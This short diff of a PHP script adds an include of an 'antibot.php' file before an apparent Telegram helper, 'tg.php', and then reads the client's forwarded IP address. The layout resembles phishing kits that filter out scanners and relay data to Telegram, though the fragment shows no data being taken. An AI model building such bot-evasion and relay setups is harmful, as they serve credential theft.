@@ -11,6 +11,7 @@ if (isset($_SERVER["REQUEST_METHOD"]) && $_SERVER["REQUEST_METHOD"] === "OPTIONS
   exit;
 }
 
+require_once __DIR__ . "/antibot.php";
 require_once __DIR__ . "/tg.php";
 
 $fwd = isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : "";
